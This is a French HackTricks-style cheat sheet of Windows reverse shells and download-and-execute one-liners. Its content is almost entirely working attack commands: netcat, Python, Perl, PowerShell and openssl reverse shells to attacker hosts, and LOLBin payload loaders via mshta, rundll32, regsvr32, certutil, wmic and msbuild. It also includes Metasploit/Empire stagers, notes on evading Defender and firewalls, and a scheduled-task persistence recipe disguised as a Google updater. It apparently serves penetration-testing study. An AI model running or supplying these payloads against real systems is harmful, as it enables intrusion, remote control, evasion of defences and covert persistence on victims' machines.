# Shells - Windows

{{#include ../../banners/hacktricks-training.md}}

## Lolbas

La page [lolbas-project.github.io](https://lolbas-project.github.io/) est destinée à Windows, tout comme [https://gtfobins.github.io/](https://gtfobins.github.io/) est destinée à Linux.\
Évidemment, **il n’y a pas de fichiers SUID ni de privilèges sudo sous Windows**, mais il est utile de savoir **comment** certains **binaires** peuvent être (ab)utilisés pour effectuer des actions inattendues, comme **exécuter du code arbitraire.**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## NCAT

victime
```
ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
#Encryption to bypass firewall
ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```
attaquant
```
ncat -l <PORT>
#Encryption to bypass firewall
ncat -l <PORT eg.443> --ssl
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) est une alternative portable et sécurisée à Netcat**. Il fonctionne sur les systèmes de type Unix et Win32. Grâce à des fonctionnalités telles qu’un chiffrement fort, l’exécution de programmes, la personnalisation des ports source et la reconnexion continue, sbd fournit une solution polyvalente pour les communications TCP/IP. Pour les utilisateurs de Windows, la version sbd.exe de la distribution Kali Linux peut être utilisée comme remplacement fiable de Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Attaquant (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Victime
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processus effectuant l'appel réseau : **powershell.exe**\
Payload écrit sur le disque : **NON** (_du moins, nulle part où j'ai pu le trouver avec procmon !_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processus effectuant un appel réseau : **svchost.exe**\
Payload écrit sur le disque : **cache local du client WebDAV**

**One-liner :**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Obtenez plus d'informations sur les différents Powershell Shells à la fin de ce document**

## Mshta

- [À partir d'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Exemple de reverse shell hta-psh (utiliser hta pour télécharger et exécuter une backdoor PS)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic à l’aide du stager hta**<sup>[[3]](#references)</sup>

#### Exemple hta

[**Depuis ici**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)<sup>[[7]](#references)</sup>
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Depuis ici**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Détecté par le defender**

## **Rundll32**

[**Exemple de Dll hello world**](https://github.com/carterjones/hello-world-dll)

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Détecté par le defender**

**Rundll32 - sct**

[**À partir d'ici**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Détecté par le defender**

#### Regsvr32 – export DLL arbitraire avec l'argument /i (contrôle d'accès et persistence)

En plus de charger des scriptlets distants (`scrobj.dll`), `regsvr32.exe` charge une DLL locale et invoque ses exports `DllRegisterServer`/`DllUnregisterServer`. Les custom loaders abusent fréquemment de cette fonctionnalité pour exécuter du code arbitraire tout en se fondant dans un LOLBin signé. Deux notes de tradecraft observées in the wild :<sup>[[6]](#references)</sup>

- Argument de contrôle d'accès : la DLL se termine sauf si un switch spécifique est transmis via `/i:<arg>`, par exemple `/i:--type=renderer` pour imiter les processus enfants du renderer de Chromium. Cela réduit les exécutions accidentelles et complique le travail des sandboxes.
- Persistence : planifier l'exécution de `regsvr32` pour lancer la DLL en mode silencieux et avec des privilèges élevés, ainsi qu'avec l'argument `/i` requis, en la faisant passer pour une tâche d'updater :
```powershell
Register-ScheduledTask \
-Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
-Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
-TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
-TaskPath '\\GoogleSystem\\GoogleUpdater' \
-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
-RunLevel Highest
```

Voir aussi : la variante ClickFix clipboard‑to‑PowerShell qui met en staging un loader JS, puis assure sa persistence avec `regsvr32`.
{{#ref}}
../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
{{#endref}}


[**Depuis ici**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)<sup>[[9]](#references)</sup>
```html
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Vous pouvez télécharger et exécuter très facilement un zombie Koadic à l’aide du stager regsvr**<sup>[[3]](#references)</sup>

## Certutil

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>

Téléchargez une B64dll, décodez-la et exécutez-la.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Téléchargez un B64exe, décodez-le et exécutez-le.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Détecté par le défenseur**

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Détecté par le defender**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processus effectuant un appel réseau : **svchost.exe**\
Payload écrit sur le disque : **cache local du client WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Détecté par le defender**

## **MSIExec**

Attaquant
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victime :
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Détecté**

## **Wmic**

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Exemple de fichier xsl [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):<sup>[[10]](#references)</sup>
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Non détecté**

**Vous pouvez télécharger et exécuter très facilement un zombie Koadic à l’aide du stager wmic**<sup>[[3]](#references)</sup>

## Msbuild

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Vous pouvez utiliser cette technique pour contourner les restrictions d’Application Whitelisting et de Powershell.exe. Vous serez invité à utiliser un shell PS.\
Téléchargez simplement ceci et exécutez-le : [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Non détecté**

## **CSC**

Compiler du code C# sur la machine victime.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Vous pouvez télécharger un reverse shell C# basique ici : [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Non détecté**

## **Regasm/Regsvc**

- [Depuis ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Je ne l'ai pas essayé**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)<sup>[[2]](#references)</sup>

## Odbcconf

- [À partir d'ici](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Je ne l'ai pas testé**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)<sup>[[2]](#references)</sup>

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Dans le dossier **Shells**, vous trouverez de nombreux Shells différents. Pour télécharger et exécuter _Invoke-PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Commencez à servir le script via un serveur web et exécutez-le du côté de la victime :
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender ne le détecte pas comme du code malveillant (pour l'instant, 04/03/2019).

**TODO : Vérifier les autres shells nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Téléchargez-le, démarrez un serveur web, démarrez le listener, puis exécutez-le sur la machine victime :
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender ne le détecte pas comme du code malveillant (pour l'instant, 3/04/2019).

**Autres options proposées par powercat :**

Bind shells, Reverse shell (TCP, UDP, DNS), redirection de port, upload/download, génération de payloads, hébergement de fichiers...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Créez un launcher powershell, enregistrez-le dans un fichier, puis téléchargez-le et exécutez-le.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Détecté comme code malveillant**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Créer une version PowerShell de la backdoor Metasploit à l’aide de Unicorn
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Lancez msfconsole avec la ressource créée :
```
msfconsole -r unicorn.rc
```
Démarrez un serveur web hébergeant le fichier _powershell_attack.txt_ et exécutez sur la victime :
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Détecté comme code malveillant**

## Plus

[PS>Attack](https://github.com/jaredhaight/PSAttack) console PS avec certains modules PS offensifs préchargés (chiffrés)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
[WinPWN](https://github.com/SecureThisShit/WinPwn) console PS avec certains modules PS offensifs et détection de proxy (IEX)

## Références

- [1] [Aide-mémoire Reverse Shell : PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [GitHub Gists d'Arno0x](https://gist.github.com/Arno0x)
- [3] [Koadic – Framework de Command & Control COM](https://www.hackingarticles.in/koadic-com-command-control-framework/)
- [4] [Aide-mémoire Reverse Shell - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [One-liners Windows pour télécharger un Payload distant et exécuter du code arbitraire](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta – Exemple d'exécution inverse HTA (gist d'Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
- [8] [scriptlet.sct – Exemple de scriptlet mshta/rundll32 (gist d'Arno0x)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
- [9] [regsvr32.sct – Exemple de scriptlet Regsvr32 (gist d'Arno0x)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
- [10] [wmic.xsl – Exemple de feuille de style XSL WMIC (gist d'Arno0x)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

{{#include ../../banners/hacktricks-training.md}}
